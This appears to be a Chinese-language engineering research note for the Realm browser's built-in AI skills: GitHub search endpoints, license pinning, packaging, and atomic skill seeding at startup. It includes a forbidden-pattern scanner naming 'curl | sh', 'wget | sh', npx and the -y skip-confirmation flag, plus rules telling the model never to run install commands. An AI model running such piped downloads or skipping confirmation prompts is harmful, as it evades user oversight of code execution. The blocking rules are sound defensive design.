    res = await net.fetch(currentUrl, {
      headers: {
        'User-Agent': 'RealmBrowser/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/json,text/plain,*/*',
      },
      redirect: 'manual',
      signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
    });
```

**[VERIFIED: ai-manager.js:5382-5423]** —— `web_fetch` 工具契约：`url` 必填、`maxLength` 可选**默认 12000**；返回 `content[0].text = result.markdown`，`details = { url, format, truncated }`。

**三条对 find-skills 正文有直接影响的推论：**

| 事实 | 对正文的影响 |
|------|--------------|
| `format: 'json'` 会出现在 `details` 里 | 模型能自证"拿到的是 JSON 而非被转坏的 HTML" |
| **默认 `maxLength = 12000` 字符**（`ai-manager.js:5401`） | GitHub 搜索 API 的 `per_page=10` 响应（含 owner 嵌套对象、各种 `*_url` 字段）**很容易超过 12000 字符被截断**（`search-manager.js:1637-1642` 追加 `[内容已截断...]`）。**正文必须指导模型显式传 `maxLength`**（建议 30000）或用 `per_page=5`。这是一个真实会踩的坑 |
| 截断是**字符数**不是字节数 | 中文不参与（GitHub API 响应是 ASCII 为主） |

**[INFERRED]** 截断风险的具体量级：实测 `per_page=2` 的响应 600 字符只覆盖前 1.5 个 item 的 `owner` 对象。按比例 `per_page=10` 约 15000-25000 字符 → **必然截断**。结论：正文用 `per_page=5` + `maxLength=30000`。

#### A-2. 技能索引端点候选 —— ✅ 实测，**一个可用、一个不可用**

**[VERIFIED: live curl 2026-09-11, `User-Agent: RealmBrowser/1.0`]**

| 端点 | 实测结果 | 可用性 |
|------|----------|--------|
| `GET https://api.github.com/search/repositories?q=topic%3Aagent-skills&sort=stars&per_page=3` | **HTTP 200**，`content-type: application/json; charset=utf-8`。返回 `total_count: 22382` 与 `items[]`，每项含 `full_name` / `stargazers_count` / `license.spdx_id` / `default_branch` / `pushed_at` | ✅ **主端点** |
| `GET https://api.github.com/search/code?q=filename:SKILL.md` | **HTTP 401**：`{"message":"Requires authentication","documentation_url":"https://docs.github.com/rest","status":"401"}` | ❌ **不可用，必须从正文划掉** |
| `GET https://api.github.com/repos/{owner}/{repo}/commits?path=...&per_page=1` | **HTTP 200** | ✅ 仅用于 P10 归属取证（实现期一次性），不进 find-skills 正文 |
| `GET https://api.github.com/rate_limit` | **HTTP 200**，`"search": {"limit": 10, "remaining": 10}`、`"core": {"limit": 60, "remaining": 52}` | 用于正文里的限流说明 |

**可用的 `q=` 限定符（无需鉴权）：** `topic:<name>`、`in:name`、`in:description`、`stars:>N`、`language:`、`sort=stars|updated`、`order=desc`、`per_page`（≤100）。**`filename:` 只有 code search 支持，而 code search 需要鉴权 → 不可用。**

**实测 `topic:agent-skills` 的头部结果（可作为正文示例）：**

```
anthropics/skills          | stars 175706 | license None      | branch main | pushed 2026-09-10
DietrichGebert/ponytail    | stars 134988 | license MIT       | branch main | pushed 2026-09-07
nexu-io/open-design        | stars  95475 | license Apache-2.0| branch main | pushed 2026-09-11
```

**⚠️ 一个必须写进正文的诚实提示：** `anthropics/skills` 的 `license.spdx_id` 是 **`None`** —— 因为该仓库根目录没有 GitHub 能识别的 LICENSE 文件（真实许可证在 `skills/<name>/LICENSE.txt` 里）。这直接说明**不能只信 API 的 license 字段**，必须 `web_fetch` 进仓库核验。这正好是 D-01「逐条核验后才输出」的实证理由。

**[ASSUMED] 关于「是否存在其他开放的 Agent-Skills 注册表」：** 我在本次会话**没有**找到可无鉴权查询的独立技能注册表。CONTEXT 的 D-01 提到"（GitHub 搜索 API / 技能注册表）"，建议正文**只写 GitHub 搜索 API 一个主端点**；若 planner 想加第二端点，需要单独实证（不要凭印象写进正文 —— 正文里一个坏端点会让模型反复失败）。

#### A-3. find-skills 改写版正文结构提纲

**上游基线（[VERIFIED: live curl]** `vercel-labs/skills@773fb2c` 的 `skills/find-skills/SKILL.md`）：**5,472 字节 / 141 行 / 12 行含 `npx` / 15 行含 `install`**。逐行性质：

```
第  23 行：The Skills CLI (`npx skills`) is the package manager for the open agent skills ecosystem.
第  27 行：- `npx skills find [query] [--owner <owner>]` - Search for skills ...
第  28 行：- `npx skills add <package>` - Install a skill from GitHub or other sources
第  29 行：- `npx skills update` - Update all installed skills
第  61 行：- User asks "how do I make my React app faster?" → `npx skills find react performance`
第  90 行：npx skills add vercel-labs/agent-skills@react-best-practices
第 100 行：npx skills add <owner/repo@skill> -g -y          ← PITFALLS P1 引用的原文
第 103 行：The `-g` flag installs globally (user-level) and `-y` skips confirmation prompts.
第 131 行：3. Suggest the user could create their own skill with `npx skills init`
第 140 行：npx skills init my-xyz-skill
```

**第 100 行 + 第 103 行是 P1 门禁的靶心**：它不只是"提到 npx"，而是**逐字解释了 `-g` 装到全局、`-y` 跳过确认** —— 一份完整的绕过说明书。

**改写版正文提纲（建议落到 `skills-builtin/find-skills/SKILL.md`）：**

```
---
name: find-skills
description: 在开源技能生态中检索 Agent 技能并输出候选清单，由用户在设置页导入安装。当用户问「有没有能做 X 的技能」「帮我找个技能」时使用。
disable-model-invocation: true
---

# 技能发现（find-skills）

## ⛔ 本技能的能力边界（先读这一段）            ← D-02 显式禁令段，放最前
- 本技能**只产出候选清单**，绝不执行任何安装 / 下载 / 更新命令。
- 本技能**不调用**任何包管理器、CLI 或网络安装脚本。
- 安装一律由**用户**在 Realm 内完成：设置 → AI → 技能管理 → 导入。
- 若用户要求你"直接装上"，回答：本技能不能安装，请走上面的导入入口。

## 何时使用
（触发语示例，中文）

## 检索流程（三步，顺序固定）
1. 用 web_fetch 打 GitHub 搜索 API 取结构化候选（给出完整 URL 模板 + per_page=5 + maxLength=30000）
2. 逐条 web_fetch 仓库页**核验**（重点核：是否真有 SKILL.md、许可证、是否活跃）
3. 只有第 1 步失败（403 限流 / 网络错误）才用 web_search 兜底

## 检索端点（唯一允许的端点）
（GitHub 搜索 API 的可用 q= 限定符清单；明确写"code search 端点需要鉴权，不可用"；
 明确写"搜索配额 10 次/分钟，一次取够不要逐条查"）

## 核验规则（不核验不得输出）
- 必须打开仓库页确认 SKILL.md 存在
- 必须核出许可证（不要只信搜索 API 的 license 字段 —— 实测 anthropics/skills 返回 None）
- 核验失败 → 丢弃该候选，不要凭搜索结果片段输出

## 输出格式（候选清单）
（每条固定字段：名称 / 用途 / 仓库 URL / 许可证 / 最后活跃时间；表格或列表）

## 用户如何安装（指路，不是执行）
设置 → AI → 技能管理 → 导入 （D-03 前瞻指向）

## 边界情况
- API 返回 403（限流）→ 告知用户稍后再试，或用 web_search 兜底
- 用户想创建新技能 → 指路 skill-creator 技能（不要提任何 init 命令）
```

**逐句评审：哪些句子构成"可执行安装语义"从而必须避免**

| ❌ 必须避免的句子形态 | ✅ 允许的等价表达 | 理由 |
|---|---|---|
| "运行 `npx skills find X`" | "用 `web_fetch` 请求 `https://api.github.com/search/repositories?q=X`" | 前者模型会当 bash 命令执行（→ 触发确认卡片 → 用户可能点确认）；后者走工具层，零执行语义 |
| "安装这个技能" / "add the skill" | "输出候选清单，由用户在设置页导入" | 第一人称祈使句会被模型当成待办任务 |
| "`-g` 装到全局" / "`-y` 跳过确认" | 完全不出现 | 这是**安全绕过说明**，比单纯提到 npx 更危险 |
| "下载到工作区" / "下载并执行" | 完全不出现 | D-01 的"只读网络发现"排除了下载语义 |
| "如果导入入口还没有，先手动把目录放到 `agent-skills/`" | 完全不出现 | D-03 明确否决（手改目录接近安装语义） |
| "更新已安装的技能" | 完全不出现 | update 也是安装语义 |
| "可以用 `curl` 拉取…" | 完全不出现 | `curl \| sh` 已被 P1 点名 |

**判断标准（CONTEXT 要求的形式化）：** 对每一行问「**这段文字被模型执行后会做什么**」。若答案是"发起一次工具调用（web_fetch/web_search/read/write）"→ 安全；若答案是"在 bash 里跑一条命令"→ 必须改写。

#### A-4. 禁用词 / 禁用模式的机器可检清单（供测试断言）

**建议的扫描器（供 `tests/test-builtin-skills-seeder.js` 使用）：**

```js
// 扫描范围：skills-builtin/**/*　（不只 SKILL.md —— 覆盖 scripts/ 与 resources）
const FORBIDDEN_PATTERNS = [
  // —— 英文 CLI / 包管理器形态 ——
  { re: /\bnpx\b/i,                    why: 'npx 包执行器' },
  { re: /\bnpm\s+(i|install|ci|exec|add)\b/i, why: 'npm 安装/执行' },
  { re: /\bpnpm\s+(add|install|dlx|exec)\b/i, why: 'pnpm 安装/执行' },
  { re: /\byarn\s+(add|install|dlx|exec)\b/i, why: 'yarn 安装/执行' },
  { re: /\bbun\s+(add|install|x)\b/i,  why: 'bun 安装/执行' },
  { re: /\bpip3?\s+install\b/i,        why: 'pip 安装' },
  { re: /\bpython3?\s+-m\s+pip\s+install\b/i, why: 'python -m pip 安装' },
  { re: /\buv\s+(pip\s+install|add|tool\s+install)\b/i, why: 'uv 安装' },
  { re: /\buvx\b/i,                    why: 'uv 包执行器' },
  { re: /\bbrew\s+(install|upgrade|reinstall)\b/i, why: 'Homebrew 安装' },
  { re: /\bcargo\s+install\b/i,        why: 'cargo 安装' },
  { re: /\bgo\s+install\b/i,           why: 'go 安装' },
  { re: /\bgem\s+install\b/i,          why: 'gem 安装' },
  { re: /curl[^\n|]*\|\s*(sh|bash|zsh|python3?|node)\b/i, why: '下载并管道执行' },
  { re: /\bwget[^\n|]*\|\s*(sh|bash|zsh|python3?|node)\b/i, why: '下载并管道执行' },
  { re: /\bapt(-get)?\s+install\b/i,   why: 'apt 安装' },
  // —— 危险旗标（必须在任何命令上下文里都禁止）——
  { re: /(^|\s)-y(\s|$)/,              why: '跳过确认旗标 -y' },
  { re: /--yes\b/,                     why: '跳过确认旗标 --yes' },
  { re: /(^|\s)-g(\s|$)/,              why: '全局安装旗标 -g' },
  { re: /--global\b/,                  why: '全局安装旗标 --global' },
  // —— 中文语义等价写法 ——
  { re: /安装到全局/,                   why: '全局安装（中文）' },
  { re: /下载并执行/,                   why: '下载并执行（中文）' },
  { re: /自动安装/,                     why: '自动安装（中文）' },
  { re: /执行安装命令/,                 why: '执行安装命令（中文）' },
  { re: /跳过确认/,                     why: '跳过确认（中文）' },
  { re: /装到系统/,                     why: '装到系统（中文）' },
];

// 执行安装的祈使句：英文 + 中文
const INSTALL_IMPERATIVES = [
  { re: /\b(install|add|update)\s+(the\s+)?skill\b/i },
  { re: /\brun\s+the\s+following\s+command\b/i },
  { re: /请执行以下命令/ }, { re: /运行以下命令/ },
];
```

**已知需要白名单豁免的例外（否则扫描器会误报）：**

| 位置 | 文本 | 为什么必须豁免 |
|------|------|----------------|
| `skill-creator/SKILL.md`（上游正文） | `Package and Present` 段落的 `package_skill.py` 引用 | `package` ≠ `install`；`package_skill.py` 生成 `.zip`，不安装 |
| `skill-creator/scripts/check_env.mjs` | `installGuidance` 字段名与 `Do not auto-install dependencies from this skill.` 文案 | 这是**禁止**安装的声明，命中 `install` 关键词但语义相反 |
| `skill-creator/scripts/check_env.mjs` | `missing_dependency` 分支 | 同上 |
| 两个 `LICENSE.txt` | Apache-2.0 第 3 节含 `install`??? | **实测：LICENSE.txt 不命中任何模式**（已跑全量扫描，含 LICENSE 在内 15 文件命中 0） |

> **⚠️ 给 planner 的落地建议：** 上面的禁用词表**不要**做成"对 `skills-builtin/**` 的无豁免全文扫描"—— 这会被 `check_env.mjs` 的 `installGuidance` 与 `Do not auto-install` 文案直接打爆。**建议二段式**：
> - **第 1 段（无豁免，零容忍）**：只扫 `SKILL.md` 文件（两个）+ 两个 `LICENSE.txt`。这是 P1 门禁的字面判据（ROADMAP 成功判据 2 说的是"内置技能全文"。**实测这两个 SKILL.md 与 LICENSE 可以做到零命中**：skill-creator 上游 SKILL.md 实测 0 命中；find-skills 是我们自己写的）。
> - **第 2 段（带行级豁免清单）**：扫 `scripts/` 与 `resources/`，豁免清单里显式列出 `check_env.mjs` 的那两处"禁止安装"文案（在测试里写死行号或匹配上下文，并在测试注释里说明为什么豁免）。
>
> 这样既满足门禁的严格性，又不会因为一份"请勿自动安装"的声明而红。

### B. skill-creator 取用与 check_env.mjs（D-05/D-06/D-07）

#### B-1. 上游固定 commit SHA —— ✅ 实测取得（可直接写入 `THIRD_PARTY_NOTICES`）

**[VERIFIED: live curl 2026-09-11]**

| 项 | 值 | 取值命令 |
|----|----|----------|
| **anthropics/skills — `skills/skill-creator/SKILL.md` 最后改动 commit** | **`b0cbd3df1533b396d281a6886d5132f623393a9c`** | `curl -s -H "User-Agent: RealmBrowser/1.0" "https://api.github.com/repos/anthropics/skills/commits?path=skills/skill-creator/SKILL.md&per_page=1"` |
| 该 commit 时间 | `2026-03-06T20:06:23Z` | 同上（`commit.committer.date`） |
| anthropics/skills 仓库 HEAD（参考，**不要用作固定 SHA**） | `34040c9c568585f6929bedeaad110ad08f079624`（2026-09-10） | `.../repos/anthropics/skills/commits?per_page=1` |
| **vercel-labs/skills — `skills/find-skills/SKILL.md` 最后改动 commit** | **`773fb2c7bbf16781670a3520affc4abd0c6151ae`** | `curl -s -H "User-Agent: RealmBrowser/1.0" "https://api.github.com/repos/vercel-labs/skills/commits?path=skills/find-skills/SKILL.md&per_page=1"` |
| 该 commit 时间 | `2026-07-10T20:54:38Z` | 同上 |
| vercel-labs/skills 许可证 | **MIT**（API `license.spdx_id: "MIT"`） | `.../repos/vercel-labs/skills` |
| anthropics/skills 仓库根许可证 | **API 返回 `null`**（GitHub 未在仓库根识别到许可证） | `.../repos/anthropics/skills` |
| **skill-creator/LICENSE.txt 实际内容** | **Apache License 2.0**，**11,357 字节** | `curl -s .../raw/.../skills/skill-creator/LICENSE.txt \| head -5` → `Apache License / Version 2.0, January 2004` |

**这正是 P10 说的「anthropics/skills 无仓库级 LICENSE，skill-creator 目录内为 Apache-2.0」** —— 现在两个事实都实测确认了。

**给 planner 的两条注意：** ① 固定 SHA **必须用 `path=` 过滤后取到的那个 commit**（`b0cbd3df…`），不要用仓库 HEAD（HEAD 每天都在动，用 HEAD 等于没有固定）。② 归档副本落地后**必须核对字节数与 SHA 声明的时点一致**（`SKILL.md` 应为 **33,168 字节**；若不符说明取错了版本）。

#### B-2. 上游 `SKILL.md` 结构总览与改写判断 —— ✅ 已取全文

**[VERIFIED: live curl + `grep -n "^#\{1,4\} "`]** 上游 `SKILL.md` = **33,168 字节**，一级/二级标题（行号为上游文件行号）：

```
  6: # Skill Creator
 32: ## Communicating with the user
 45: ## Creating a skill
 47:   ### Capture Intent
 56:   ### Interview and Research
 62:   ### Write the SKILL.md
 71:   ### Skill Writing Guide
 73:     #### Anatomy of a Skill
 86:     #### Progressive Disclosure
111:     #### Principle of Lack of Surprise
115:     #### Writing Patterns
121: ## Report structure
131: ## Commit message format
137:   ### Writing Style
141:   ### Test Cases
163: ## Running and evaluating test cases
169:   ### Step 1: Spawn all runs (with-skill AND baseline) in the same turn
199:   ### Step 2: While runs are in progress, draft assertions
207:   ### Step 3: As runs complete, capture timing data
221:   ### Step 4: Grade, aggregate, and launch the viewer
253:   ### What the user sees in the viewer
267:   ### Step 5: Read the feedback
292: ## Improving the skill
296:   ### How to think about improvements
308:   ### The iteration loop
325: ## Advanced: Blind comparison
333: ## Description Optimization
337:   ### Step 1: Generate trigger eval queries
360:   ### Step 2: Review with user
375:   ### Step 3: Run the optimization loop
396:   ### How skill triggering works
402:   ### Step 4: Apply the result
408: ## Package and Present (only if `present_files` tool is available)
420: ## Claude.ai-specific instructions
445: ## Cowork-Specific Instructions
459: ## Reference files
```

**[VERIFIED]** 脚本引用位置（上游 SKILL.md 内）：`scripts/` 在 `Anatomy of a Skill`（`:73-85`）被描述为目录结构的一部分；`eval-viewer/generate_review.py` 在 Step 4（`:221-252`）被调用；`scripts/package_skill.py` 在 `Package and Present`（`:408`）；`references/schemas.md` 在 `Reference files`（`:459`）。

**[VERIFIED]** 上游 SKILL.md **无任何安装语义**（`grep -iE "pip install|npm i|npx|curl .*\| *(sh|bash)|apt-get|brew install|uv pip|install the missing"` → **0 命中**）。

**D-07 落地判断 —— 哪些段落需要改写、哪些保留：**

| 章节 | 处理 | 理由 |
|------|------|------|
| `# Skill Creator` / `## Communicating with the user` / `## Creating a skill`（含 4 个 `###`）/ `## Report structure` / `## Commit message format` / `## Improving the skill` | **保留原文** | 纯作者指南，零执行语义，零工具依赖（D-07 的"主路径"） |
| `## Running and evaluating test cases`（含 5 个 `### Step`） | **改写引导语，保留正文** | 这 5 步是 `run_eval.py` / `aggregate_benchmark.py` / `generate_review.py` 的用法说明。D-07 要求"仅当确实需要评测能力时才引导走 python3 脚本" → 需在该章**开头插入一句前置**：先调 `node scripts/check_env.mjs --capability eval-viewer` 拿能力清单，缺依赖则告知用户装什么；并把"先声明这一步是可选的" |
| `## Description Optimization`（含 4 个 `### Step`） | **同上** | 依赖 `improve_description.py` + `anthropic` 包 + `claude` CLI |
| `## Package and Present (only if \`present_files\` tool is available)` | **删除或改写为条件不可用** | `present_files` 是 Claude.ai 特有工具，Realm **没有**。保留会让模型尝试调用不存在的工具 |
| `## Claude.ai-specific instructions` | **删除** | 平台无关（Realm 不是 Claude.ai） |
| `## Cowork-Specific Instructions` | **删除** | 平台无关 |
| `## Advanced: Blind comparison` | **保留 + 标注可选** | 依赖三个 `agents/*.md`（见 Q1） |
| `## Reference files` | **保留 + 更新清单** | 需反映实际随包的文件集（含新增 `check_env.mjs`） |
| **新增 `## Environment Preflight`（文首）** | **新增** | 参照实现（openhanako 版，`:33-63`）已加了这一章，内容是 `node scripts/check_env.mjs --capability X` 的用法与 `REALM_SKILL_CREATOR_PYTHON` 覆盖说明。这是 D-05「另加一个 Node 写的 check_env.mjs 做环境预检」在正文里的落点 |

> **⚠️ D-06 要求 skill-creator「保持上游英文正文（仅做必要改写）」** —— 上面三处"删除/改写"都是**必要的**（否则模型会调用 Realm 不存在的 `present_files` 工具，或读到 Claude.ai / Cowork 平台专有指令）。改写后**必须在 `THIRD_PARTY_NOTICES` 标注 `modified`**，不能标 unmodified —— 这一点 CONTEXT 的 D-17 写的是「skill-creator 保留上游原样，标注 unmodified」，但 D-06 又要求「仅做必要改写」。**这两条存在张力，见 Q2。**

#### B-3. `check_env.mjs` 设计要点 —— ✅ 已读全文（469 行）

见 **Architecture Patterns → Pattern 5** 的对照表（capability 分组、依赖检查方式、超时与解释器覆盖的实现要点、Realm 版最小可行形状）。

#### B-4. `LICENSE.txt` 落在技能目录内是否产生加载影响 —— ✅ **实测零影响**

见 **Common Pitfalls → Pitfall 7**（含 probe 实测输出与源码根因）。

**给 planner 的结论：** `LICENSE.txt` 位于 `<name>/` 之下，**不会被当成技能、不产生诊断、不影响 prompt 段**。D-17 的"每个内置技能目录内保留上游 `LICENSE.txt`"**零代价**。

#### B-5. 体积与 `asarUnpack` 清单写法

**[VERIFIED: GitHub tree API at the pinned SHA + 逐文件字节核算]**

**上游 skill-creator 完整文件清单与体积（18 文件）：**

| 文件 | 字节 |
|------|------|
| `LICENSE.txt` | 11,357 |
| `SKILL.md` | 33,168 |
| `agents/analyzer.md` | 10,376 |
| `agents/comparator.md` | 7,287 |
| `agents/grader.md` | 9,049 |
| `assets/eval_review.html` | 7,058 |
| `eval-viewer/generate_review.py` | 16,365 |
| `eval-viewer/viewer.html` | 44,998 |
| `references/schemas.md` | 12,061 |
| `scripts/__init__.py` | 0 |
| `scripts/aggregate_benchmark.py` | 14,386 |
| `scripts/generate_report.py` | 12,847 |
| `scripts/improve_description.py` | 11,116 |
| `scripts/package_skill.py` | 4,234 |
| `scripts/quick_validate.py` | 3,972 |
| `scripts/run_eval.py` | 11,464 |
| `scripts/run_loop.py` | 13,605 |
| `scripts/utils.py` | 1,661 |
| **合计** | **225,004 B ≈ 219.7 KB** |

**加 `check_env.mjs`（参照实现 13,303 B）：238,307 B ≈ 232.7 KB / 19 文件。**

**若按 openhanako 形状（去掉 `agents/`，15 文件）：198,292 B ≈ 193.6 KB。**

**加上 find-skills 改写版（预计 3-5 KB）+ 其 LICENSE + `THIRD_PARTY_NOTICES`：整个 `skills-builtin/` 约 245 KB。**

> 对 SEED-05 的结论：**体积完全不是问题。** D-05 已接受"约 100 KB Python 随包"，实际是 ~73 KB Python + ~62 KB eval-viewer + 26 KB agents。**asrUnpack 会使这批文件在 `app.asar.unpacked/` 里出现一次，同时在 `app.asar` 里保留一份索引**（electron-builder 的 asarUnpack 语义是"解包到 unpacked 目录并在 asar 内留占位"），所以**打包产物增量约 245 KB，不是 490 KB**。

**`asarUnpack` 清单写法（D-12）：**

```json
"asarUnpack": [
  "node_modules/nodejieba/**",
  "skills-builtin/**"
]
```

**[VERIFIED: 既有可用先例]** 当前生效的 `node_modules/nodejieba/**` 用的就是 `dir/**` 形式，且实测在 `app.asar.unpacked/node_modules/nodejieba/` 下展开了**多层嵌套**（`submodules/cppjieba/dict/...`、`lib/...`、`node_modules/node-addon-api/...`）—— 证明 `**` 覆盖任意深度的嵌套目录。

**[INFERRED]** 因此 `skills-builtin/**` 会覆盖 `skills-builtin/skill-creator/scripts/*.py`、`.../eval-viewer/*.html` 等全部嵌套内容。**推荐写成 `skills-builtin/**`（与 `**` 通配一致），不要写成 `skills-builtin/**/*`** —— 后者在一些 glob 实现里不含目录本身。

**⚠️ 一个需要 planner 拍板的关联决策：** 加 `skills-builtin/**` 到 `asarUnpack` 后，这批文件会在 `app.asar.unpacked/` 与 `app.asar` 里**各存一份**（asar 内是占位/tombstone，不是全部内容 —— 所以体积没翻倍，但**目录清单里会出现两次**）。如果 planner 同时采用 Pitfall 4 的 `files` allowlist 方案 (A)，需要确保 `skills-builtin/**` 在 `files` 里**被包含**（allowlist 语义下，未列出的目录不会入包 —— 那样 asarUnpack 也就解不出东西）。**这是 (A) 方案的主要风险点。**

### C. 播种原子性与差异诊断（D-08/D-09/D-10/D-11）

#### C-1. `safeCopyDir` 算法与失败路径 —— ✅ 已读全文

见 **Architecture Patterns → Pattern 2**（含逐字源码、Realm 版可简化的 3 处、必须保留的 3 处）。

**失败路径穷举（原型覆盖的 4 条）：**
1. `_copyDirRecursive(src, tmpDst)` 抛错（源不可读 / 磁盘满）→ catch → `_cleanupDir(tmpDst)` → 重抛为 `FS_COPY_FAILED`。**目标目录未被触碰。**
2. `renameSync(dst, bakDst)` 抛错（目标被占用/权限）→ 外层 catch → 清理 tmp → 重抛。**目标目录未被触碰**（但可能已有 bak 残留，见下）。
3. `renameSync(tmpDst, dst)` 抛错 → **内层 catch 回滚**：`renameSync(bakDst, dst)` 恢复旧内容 → 清理 tmp → 重抛。**这是最关键的一条 —— 它保证"要么旧要么新"。**
4. `_cleanupDir(bakDst)` 抛错 → 外层 catch → 尝试清理 tmp → 重抛。**注意：此处 dst 已是新内容，抛错会让调用方以为失败**（原型的一个小瑕疵：成功路径上的清理失败被报成失败）。**Realm 版应把 `_cleanupDir(bakDst)` 包在自己的 try 里吞错**（残留 `.bak_<ts>` 比"报了失败但其实成功了"更可接受，且下次启动会再次覆盖）。

#### C-2. 仓库既有可复用工具 —— 部分有、关键的一个没有

**[VERIFIED: repo-wide grep]**

| 能力 | 仓库现状 | 结论 |
|------|----------|------|
| 目录递归复制 | **有先例**：`agent-workspace.js:139` `fs.cpSync(legacy, target, { recursive: true })`（`migrateAiMemory`） | 可复用 `fs.cpSync` 作为 `_copyDirRecursive` 的实现（一行替代原型的 30 行手写递归） |
| 临时目录 | `fs.mkdtempSync` 在多个测试里用过；`agent-workspace.js` 的 `createSandboxEnv` 有 `.tmp/` 目录派生 | **但播种不要用 `.tmp/`** —— 那在**沙箱 root 内**且语义是"bash 输出临时文件"。播种的 tmp 应是 `<skillDst>.tmp_<ts>`（同父目录，保证同卷） |
| 原子写（文件级） | **仓库无** `atomicWrite` 工具（openhanako 有 `safe-fs.ts:atomicWriteSync`，但 Realm 没有对应物） | 本阶段需要的是**目录级**原子替换，不是文件级；新增即可 |
| 原子目录替换 | **仓库完全没有**。`grep -rn "renameSync" --include="*.js"` 排除 node_modules 与 worktrees 后，无生产代码使用 | **必须新建**（CONTEXT `code_context` 已如实说"Realm 尚无此工具函数，需在播种模块内新建"） |
| SHA-256 hash | **有先例**：`media-cache-manager.js:69,78,300,463,478` 全部 `crypto.createHash('sha256')` | 复用同一写法 |
| 目录树 diff | **无** | 新建（C-3） |

#### C-3. 差异检测的判定口径（D-09）

**核心约束：** D-09 的诊断是**信息性的**（覆盖照常发生），所以差异检测**不能因为误报而阻断流程**，也不能因为成本高而拖慢启动。

**规模实测：** skill-creator = 19 文件 / 232.7 KB；find-skills ≈ 3 文件 / ~5 KB。合计约 22 文件 / 238 KB。**这是一个小规模问题，不需要复杂设计。**

**建议口径（分层短路，从便宜到贵）：**

```
detectDiff(srcDir, dstDir) → 'same' | 'different' | 'missing'
  ① dstDir 不存在                  → 'missing'           （零 IO 成本）
  ② 递归收集两边的相对路径集合（readdirSync withFileTypes）
     集合不等（多了/少了文件）      → 'different'         （只读目录项，不读内容）
  ③ 逐文件比较 size（fs.statSync）
     任一 size 不等                 → 'different'         （只 stat，不读内容）
  ④ 逐文件 sha256（fs.readFileSync + createHash）
     任一 hash 不等                 → 'different'         （唯一需要读内容的一步）
  ⑤ 全部相同                        → 'same'
```

**为什么选 hash 而不是"逐字节 Buffer 比较"：** ① 仓库已有 `createHash` 先例，口径统一；② 逐字节比较要**同时**把两份内容读进内存（238 KB 里最大单文件 45 KB，可接受但不必要）；③ hash 可以在第 ③ 步就把"拷贝时 mtime 变了但内容没变"的假差异挡掉（**关键：不要比 mtime** —— `safeCopyDir` 每次都会重写 mtime，用 mtime 判定会 100% 误报"用户改过"）。

> **⚠️ 最容易犯的错：用 mtime 判差异。** 因为 D-08 是"每次启动无条件覆盖"，每次覆盖都会更新 mtime —— 下次启动一比 mtime 就"不一致"，于是每次都产 `realm_builtin_seed_overwritten` 警告。**必须用内容（size + sha256），不能用时间戳。**

**成本实测口径（[INFERRED]，基于 22 文件 / 238 KB）：** 第 ④ 步在 `same` 场景下（最坏情况：全部内容都要读+hash）约 **238 KB 读盘 + 22 次 sha256** —— 亚毫秒级，启动时**可忽略**。不需要缓存中间结果（若要缓存就得引入状态文件，与 D-11 的"零状态文件"冲突）。

**诊断产出的形状（对齐 Phase 46）：**

```js
// D-09 的覆盖前诊断（每次启动、每个不一致的内置技能各一条）
{
  level: 'warning',
  code: 'realm_builtin_seed_overwritten',
  skillName: 'skill-creator',
  message: `内置技能 "skill-creator" 的磁盘内容与随包版本不一致（用户手改过？），已被随包版本覆盖。`
         + `如需长期定制，请把同名技能放到 agent-workspace/skills/（user 来源会遮蔽内置技能）。`,
  path: '<managedSkillsDir>/skill-creator',
}
```

**`message` 里必须给出"正确做法"**（对齐 `ai-skills-manager.js:533` 的 `realm_layout_violation` 风格 —— 它的 message 带着 `正确位置示例：${suggested}`）。D-10 已定「不要这个技能的唯一语义是禁用」，所以 message 还应指向启用/禁用：

```js
  message: `... 已被随包版本覆盖。内置技能不能删除或修改；如不需要它，请在 设置 → AI → 技能管理 中禁用。`
```

#### C-4. 播种调用点 —— ✅ 已定位

**[VERIFIED: main.js:4038-4041 逐字]**

```js
  // 初始化 AI 工作区（agent 根目录）并一次性迁移旧版 AI 记忆目录
  // （必须在 aiManager 创建之前：sandbox env 与 ai-memory 新路径都依赖目录就位）
  agentWorkspace.ensureWorkspaceDir();
  agentWorkspace.migrateAiMemory();
```

**[VERIFIED: main.js:4043-4051]** 紧随其后：

```js
  // 初始化 AI Manager（per Phase 19）
  aiManager = new AIManager();
  // 注入操作确认通道（pendingActions 方案）：ai-manager 的高风险操作确认
  // 统一走本模块的 requestActionConfirmation，与渲染端 action:confirm/cancel 对接
  AIManager.setActionConfirmationHandler(requestActionConfirmation);
  aiManager.init(configStore).then(() => {
```

**插入点结论：** `seedBuiltinSkills()` 必须插在 **`main.js:4041`（`migrateAiMemory()`）之后、`main.js:4043`（`new AIManager()`）之前**。

**顺序约束的三条理由：**
1. **必须在 `ensureWorkspaceDir()` 之后** —— 否则 `managed-skills/` 目录不存在，播种无处可写。
2. **必须在 `new AIManager()` / `init()` 之前** —— `init()` 会调用 `refreshSkills()`（Phase 46 的创建点覆盖机制）。若播种在 `init()` 之后，**首轮加载看不到内置技能**，用户要等到下一次 Agent 重建才看到。
3. **相对 `migrateAiMemory()` 的先后无所谓** —— 两者写的是不同目录（`ai-memory/` vs `managed-skills/`），无共享状态。放在其后只是"工作区初始化"语义上的自然分组。

**注意：播种必须是同步的（或至少在 `new AIManager()` 之前 await 完成）。** 现有两行都是同步 `fs` 调用（`ensureWorkspaceDir` / `migrateAiMemory` 都是同步函数）。建议播种也用同步 `fs` —— 与 `migrateAiMemory` 一致，避免在启动链路里引入 await。

**失败处理约定（照抄 `migrateAiMemory` 的先例）：`任何失败仅告警不阻断启动`。**

```js
// agent-workspace.js:143-147（migrateAiMemory 的错误处理，逐字）
  } catch (err) {
    console.error('[Realm] AI 记忆迁移失败（保留旧目录，下次启动重试）:', err.message);
  }
```

播种应同构：`console.error` + 产诊断 + **不 throw、不阻断启动**。

#### C-5. 播种对 `.seed.json` 类状态文件的扫描影响 —— ✅ 结论正确，D-11 无需落状态文件

**CONTEXT 要求确认："虽然 D-11 已决定不落状态文件，但需确认结论是否正确，以防 planner 误加。"**

**结论：D-11 正确。落状态文件不必要，且会引入 D-11 明确要避免的问题。**

**证据链：**

1. **状态文件不会被当成技能。** 若在 `managed-skills/` 根层放 `.seed.json`：`createSkillsEnv.listDir` 的扫描根过滤会把它滤掉（`ai-skills-manager.js:148-151`）：
   ```js
   for (const entry of res.value) {
     if (entry.kind === 'directory') dirs.push(entry);
     else droppedNotices.push({ path: entry.path, kind: entry.kind });
   }
   ```
   然后它会被转成 `realm_root_entry_skipped` **warning 诊断**（`ai-skills-manager.js:491-496`）。**所以它不仅不被当技能，还会额外产一条诊断。**
